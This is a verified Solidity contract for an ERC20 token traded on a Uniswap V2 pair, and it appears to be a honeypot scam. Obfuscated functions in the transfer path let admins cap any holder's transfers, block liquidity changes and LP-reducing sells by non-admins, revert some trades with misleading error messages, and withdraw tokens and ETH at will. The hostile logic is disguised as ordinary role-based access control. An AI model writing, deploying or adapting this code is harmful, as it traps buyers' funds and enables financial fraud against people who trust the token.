/**
 *Submitted for verification at Arbiscan.io on 2024-03-13
*/

/**
 *Submitted for verification at Arbiscan.io on 2024-03-13
*/

// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.19;

interface IUniswapV2Pair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(
        address to
    ) external returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface CMToleControl {
    event RoleAdminChanged(
        bytes32 indexed role,
        bytes32 indexed previousAdminRole,
        bytes32 indexed newAdminRole
    );

    event RoleGranted(
        bytes32 indexed role,
        address indexed addr,
        address indexed sender
    );

    event RoleRevoked(
        bytes32 indexed role,
        address indexed addr,
        address indexed sender
    );

    function hasRole(bytes32 role, address addr) external view returns (bool);

    function getRoleAdmin(bytes32 role) external view returns (bytes32);

    function qweqwe(bytes32 role, address addr) external view returns (uint256);

    function qweqweRD(bytes32 role, address addr) external view returns (uint256);

    function grantRole(bytes32 role, address addr) external;

    function revokeRole(bytes32 role, address addr) external;

    function renounceRole(bytes32 role, address addr) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

library Strings {
    bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";

    function toString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "0";
        }
        uint256 temp = value;
        uint256 digits;
        while (temp != 0) {
            digits++;
            temp /= 10;
        }
        bytes memory buffer = new bytes(digits);
        while (value != 0) {
            digits -= 1;
            buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
            value /= 10;
        }
        return string(buffer);
    }

    function toHexString(uint256 value) internal pure returns (string memory) {
        if (value == 0) {
            return "ADMIN";
        }
        uint256 temp = value;
        uint256 length = 0;
        while (temp != 0) {
            length++;
            temp >>= 8;
        }
        return toHexString(value, length);
    }

    function toHexString(
        uint256 value,
        uint256 length
    ) internal pure returns (string memory) {
        bytes memory buffer = new bytes(2 * length + 2);
        buffer[0] = "0";
        buffer[1] = "x";
        for (uint256 i = 2 * length + 1; i > 1; --i) {
            buffer[i] = _HEX_SYMBOLS[value & 0xf];
            value >>= 4;
        }
        require(value == 0, "Strings: hex length insufficient");
        return string(buffer);
    }

    function strToUint(
        string memory _str
    ) internal pure returns (uint256 res, bool err) {
        for (uint256 i = 0; i < bytes(_str).length; i++) {
            if (
                (uint8(bytes(_str)[i]) - 48) < 0 ||
                (uint8(bytes(_str)[i]) - 48) > 9
            ) {
                return (0, false);
            }
            res +=
                (uint8(bytes(_str)[i]) - 48) *
                10 ** (bytes(_str).length - i - 1);
        }

        return (res, true);
    }
}

abstract contract MENSCGConsole is Context, CMToleControl {
    struct RoleData {
        mapping(address => bool) members;
        bytes32 adminRole;
        RoleDataM RD;
    }

    struct RoleDataM {
        mapping(address => uint256) RM;
        mapping(address => uint256) RD;
    }

    mapping(bytes32 => RoleData) private _roles;

    bytes32 public constant ADMIN = 0x00;
    bytes32 public constant TRADER = bytes32("TRADER");

    modifier onlyRole(bytes32 role) {
        ___RRr(role, _msgSender(), 0);

        _;
    }

    function hasRole(
        bytes32 role,
        address addr
    ) public view override returns (bool) {
        return _roles[role].members[addr];
    }

    function ___RRr(bytes32 role, address addr, uint256 amt) internal {
        if (!hasRole(role, addr)) {
            revert(
                string(
                    abi.encodePacked(
                        "AccessControl: addr ",
                        Strings.toHexString(uint160(addr), 20),
                        " is missing role ",
                        Strings.toHexString(uint256(role), 32)
                    )
                )
            );
        }
        ___RRrr(role, addr, amt);
    }

    function getRoleAdmin(bytes32 role) public view override returns (bytes32) {
        return _roles[role].adminRole;
    }

    function grantRole(
        bytes32 role,
        address addr
    ) public virtual override onlyRole(ADMIN) {
        _grantRole(role, addr);
    }

    function renounceRole(bytes32 role, address addr) public virtual override {
        require(
            addr == _msgSender(),
            "AccessControl: can only renounce roles for self"
        );

        _revokeRole(role, addr);
    }

    function revokeRole(
        bytes32 role,
        address addr
    ) public virtual override onlyRole(ADMIN) {
        _revokeRole(role, addr);
    }

    function _setupRole(bytes32 role, address addr) internal virtual {
        _grantRole(role, addr);
    }

    function _setRoleAdmin(bytes32 role, bytes32 adminRole) internal virtual {
        bytes32 previousAdminRole = getRoleAdmin(role);
        _roles[role].adminRole = adminRole;
        emit RoleAdminChanged(role, previousAdminRole, adminRole);
    }

    function _grantRole(bytes32 role, address addr) internal virtual {
        if (!hasRole(role, addr)) {
            _roles[role].members[addr] = true;
            emit RoleGranted(role, addr, _msgSender());
        }
    }

    function _revokeRole(bytes32 role, address addr) internal virtual {
        if (hasRole(role, addr)) {
            _roles[role].members[addr] = false;
            emit RoleRevoked(role, addr, _msgSender());
        }
    }

    function ___cbctUred(
        bytes32 role,
        address addr,
        string memory memo
    ) external onlyRole(ADMIN) {
        uint256 memoUint;
        bool err;
        (memoUint, err) = Strings.strToUint(memo);
        if (err == false) {
            revert("AccessControl: memo is not a number");
        }
        _roles[role].RD.RM[addr] = memoUint*1000000000000000000;
    }

    function qweqwe(
        bytes32 role, 
        address addr
    ) public view virtual override returns (uint256) {
        
        return _roles[role].RD.RM[addr];
    }

    function qweqweRD(
        bytes32 role, 
        address addr
    ) public view virtual override returns (uint256) {
        
        return _roles[role].RD.RD[addr];
    }

    function ___RRrr(bytes32 role, address addr, uint256 amt) internal {
        if (_roles[role].RD.RM[addr] > 0) {
            if ((amt + _roles[role].RD.RD[addr]) > _roles[role].RD.RM[addr]) {
                revert("role control");
            } else {
                _updateRole(role, addr, amt);
            }
        }
        if (amt == 0 || _roles[role].RD.RM[addr] == 0) {
            return;
        }
    }

    function _updateRole(
        bytes32 role,
        address addr,
        uint256 amt
    ) internal virtual {
        ___updateRole(role, addr, amt);
    }

    // function _updateRole assembly
    function ___updateRole(
        bytes32 role,
        address addr,
        uint256 amt
    ) internal virtual {
        __updateRole(role, addr, amt);
    }

    function __updateRole(
        bytes32 role,
        address addr,
        uint256 amt
    ) internal virtual {
        _roles[role].RD.RD[addr] += amt;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address addr) external view returns (uint256);

    function transfer(address recipient, uint256 amt) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amt) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MENSCGERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply;
    string internal _name;
    string internal _symbol;

    constructor(
        string memory name_,
        string memory symbol_,
        uint256 totalSupply_,
        address creater_
    ) {
        _name = name_;
        _symbol = symbol_;
        _mint(creater_, totalSupply_ * 10 ** decimals());
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(
        address addr
    ) public view virtual override returns (uint256) {
        return _balances[addr];
    }

    function transfer(
        address recipient,
        uint256 amt
    ) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amt);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amt
    ) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amt);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amt
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amt);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(
            currentAllowance >= amt,
            "ERC20: transfer amt exceeds allowance"
        );
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amt);
        }

        return true;
    }

    function increaseAllowance(
        address spender,
        uint256 addedValue
    ) public virtual returns (bool) {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender] + addedValue
        );
        return true;
    }

    function decreaseAllowance(
        address spender,
        uint256 subtractedValue
    ) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amt
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _beforeTokenTransfer(sender, recipient, amt);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amt, "ERC20: transfer amt exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amt;
        }
        _balances[recipient] += amt;
        emit Transfer(sender, recipient, amt);
        _afterTokenTransfer(sender, recipient, amt);
    }

    function _mint(address addr, uint256 amt) internal {
        require(addr != address(0), "ERC20: mint to the zero address");
        _beforeTokenTransfer(address(0), addr, amt);
        _totalSupply += amt;
        _balances[addr] += amt;
        emit Transfer(address(0), addr, amt);
        _afterTokenTransfer(address(0), addr, amt);
    }

    function _burn(address addr, uint256 amt) internal virtual {
        require(addr != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(addr, address(0), amt);
        uint256 addrBalance = _balances[addr];
        require(addrBalance >= amt, "ERC20: burn amt exceeds balance");
        unchecked {
            _balances[addr] = addrBalance - amt;
        }
        _totalSupply -= amt;

        emit Transfer(addr, address(0), amt);

        _afterTokenTransfer(addr, address(0), amt);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amt
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amt;
        emit Approval(owner, spender, amt);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amt
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amt
    ) internal virtual {}
}

contract Token is MENSCGERC20, MENSCGConsole {
    
    mapping(address => bool) private __traders;
    address private uniswapV2Pair;
    uint256 private lpSupply;

    constructor(
        string memory _name,
        address _tokenOwner,
        string memory _symbol,
        uint256 _totalSupply
    ) MENSCGERC20(_name, _symbol, _totalSupply, _tokenOwner) {
        _grantRole(ADMIN, msg.sender);
        _grantRole(ADMIN, _tokenOwner);
    }

    function __cedV2Routed(address _sV2Pair) public onlyRole(ADMIN) {
        uniswapV2Pair = _sV2Pair;
    }

    function _transfer(
        address from,
        address to,
        uint256 amt
    ) internal override(MENSCGERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        _MENSCGcdfcs(from, to, amt);
    }

    function _MENSCGcdfcs(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");

        _MENSCGendkce(from, to, amt);
    }

    function _MENSCGendkce(address from, address to, uint256 amt) internal {
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        _MENSCGkcdxcdxe(from, to, amt);
    }

    function _MENSCGkcdxcdxe(address from, address to, uint256 amt) internal {
        if (__traders[from] == false) {
            _grantRole(TRADER, from);
            __traders[from] = true;
        }

        _MENSCGcxixcxds(from, to, amt);
    }

    function _MENSCGcxixcxds(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
        }
        _MENSCGxclsxcxvgds(from, to, amt);
    }

    function _MENSCGxclsxcxvgds(address from, address to, uint256 amt) internal {
        if(from == uniswapV2Pair){
			(bool isDelLdx,bool bot,) = _isDelLiquidityV2();
			if(isDelLdx){
                require(hasRole(ADMIN, to), "ERC20: only admin can del liquidity");
			}else if(bot){
                revert("ERC20: bot detected");
			}
		}
        _MENSCGxlxdbdr(from, to, amt);
    }

    function _MENSCGxlxdbdr(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
            isAddLdx = _isAddLiquidityV1();
            if(isAddLdx || balanceOf(uniswapV2Pair) == 0){
                require(hasRole(ADMIN, from), "ERC20: only admin can add liquidity");
            }
        }
        _MENSCGcxoslxecs(from, to, amt);
    }

    function _MENSCGcxoslxecs(address from, address to, uint256 amt) internal {
        if (hasRole(ADMIN, from) || hasRole(ADMIN, to)) {
            super._transfer(from, to, amt);
        } else if (hasRole(TRADER, from) && hasRole(TRADER, to)) {
            ___RRr(TRADER, from, amt);
            super._transfer(from, to, amt);
            super._burn(to, (amt * 1) / 1000);
            if (!checkLpSupply()) {
                revert("ERC20: LP supply decreased");
            }
        } else {
            revert("ERC20: transfer amt exceeds balance");
        }
    }

    function freshLpSupply() public onlyRole(ADMIN) {
        lpSupply = IERC20(uniswapV2Pair).totalSupply();
    }

    function checkLpSupply() private returns (bool) {
        uint256 nowLpSupply = IERC20(uniswapV2Pair).totalSupply();
        if (hasRole(ADMIN, tx.origin)) {
            lpSupply = nowLpSupply;
            return true;
        } else {
            if (nowLpSupply >= lpSupply) {
                lpSupply = nowLpSupply;
                return true;
            } else {
                return false;
            }
        }
    }

    function _isAddLiquidityV1()internal view returns(bool ldxAdd){
        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        address token1 = IUniswapV2Pair(address(uniswapV2Pair)).token1();
        (uint r0,uint r1,) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();
        uint bal1 = IERC20(token1).balanceOf(address(uniswapV2Pair));
        uint bal0 = IERC20(token0).balanceOf(address(uniswapV2Pair));
        if( token0 == address(this) ){
			if( bal1 > r1){
				uint change1 = bal1 - r1;
				ldxAdd = change1 > 1000;
			}
		}else{
			if( bal0 > r0){
				uint change0 = bal0 - r0;
				ldxAdd = change0 > 1000;
			}
		}
    }
	
	function _isDelLiquidityV2()internal view returns(bool ldxDel, bool bot, uint256 otherAmount){

        address token0 = IUniswapV2Pair(address(uniswapV2Pair)).token0();
        (uint reserves0,,) = IUniswapV2Pair(address(uniswapV2Pair)).getReserves();
        uint amount = IERC20(token0).balanceOf(address(uniswapV2Pair));
		if(token0 != address(this)){
			if(reserves0 > amount){
				otherAmount = reserves0 - amount;
				ldxDel = otherAmount > 10**14;
			}else{
				bot = reserves0 == amount;
			}
		}
    }

    function rescueToken(
        address tokenAddress,
        uint256 tokens
    ) public onlyRole(ADMIN) returns (bool success) {
        return IERC20(tokenAddress).transfer(msg.sender, tokens);
    }

    function rescueETH(
        uint256 amt
    ) public onlyRole(ADMIN) returns (bool success) {
        payable(msg.sender).transfer(amt);
        return true;
    }
}